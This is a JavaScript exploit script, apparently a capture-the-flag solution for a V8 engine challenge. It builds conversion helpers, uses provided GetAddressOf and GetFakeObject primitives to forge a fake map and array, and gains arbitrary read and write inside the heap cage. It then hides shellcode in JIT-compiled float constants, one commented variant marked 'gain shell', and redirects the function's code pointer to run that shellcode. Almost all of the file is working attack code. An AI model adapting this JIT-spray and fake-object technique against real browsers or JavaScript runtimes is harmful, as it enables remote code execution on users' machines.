var buf = new ArrayBuffer(8);
var f64 = new Float64Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);

function lh_u32_to_f64(l,h){
    u32[0] = l;
    u32[1] = h;
    return f64[0];
}

function f64_to_u64(val){
    f64[0] = val;
    return u64[0];
}

function u64_to_f64(val){
    u64[0] = val;
    return f64[0];
}

// function stop(){
//     %SystemBreak();
// }

// function p(arg){
//     %DebugPrint(arg);
// }

function spin(){
    while(1){};
}

function hex(str){
    return str.toString(16).padStart(16,0);
}

function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}


// // gain shell
// const shellcode = () => {return [
//     1.9553825422107533e-246,
//     1.9560612558242147e-246,
//     1.9995714719542577e-246,
//     1.9533767332674093e-246,
//     2.6348604765229606e-284
// ];}

const shellcode = () => {return [
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}

for(let i = 0; i< 0x10000; i++){
    shellcode();
}

// p(shellcode);

var rw_array = [1.1,2.2,3.3,4.4];
var fake_map = [u64_to_f64(0x3600000a001c0261n), u64_to_f64(0x0a0007ff11000844n)]; 
var fake_map_addr = GetAddressOf(fake_map) + 0x24 + 0x30;
var rw_array_element_addr = GetAddressOf(rw_array)-0x28;
// 

var fake_array = [
    lh_u32_to_f64(fake_map_addr+1,0),
    lh_u32_to_f64(rw_array_element_addr+1,0x100)
]

var fake_array_addr = GetAddressOf(fake_array)+0x24+0x30;
var fake_obj = GetFakeObject(fake_array_addr);

// p(rw_array);
// p(fake_array);
// p(fake_map);
// logg("fake_map_addr",fake_map_addr);
// logg("rw_array_element_addr",rw_array_element_addr);
// logg("fake_array_addr",fake_array_addr);

// console.log(typeof fake_obj);

function cage_read(addr){
    fake_array[1] = lh_u32_to_f64(Number(addr)-8+1,0x100);
    return Number(f64_to_u64(fake_obj[0]));
}

function cage_write(addr,val){
    fake_array[1] = lh_u32_to_f64(addr-8+1,0x100);
    fake_obj[0] = u64_to_f64(val);
}

var shellcode_addr = GetAddressOf(shellcode);
var code_addr = cage_read(shellcode_addr+0xc) >> 32;
var ins_base = cage_read(code_addr-1+0x14);

logg("shellcode_addr",shellcode_addr);
logg("code_addr",code_addr);
logg("ins_base",ins_base);
logg("rop_addr",ins_base+0x6b);

cage_write(code_addr-1+0x14,BigInt(ins_base+0x6b))


// stop();
shellcode();

// spin();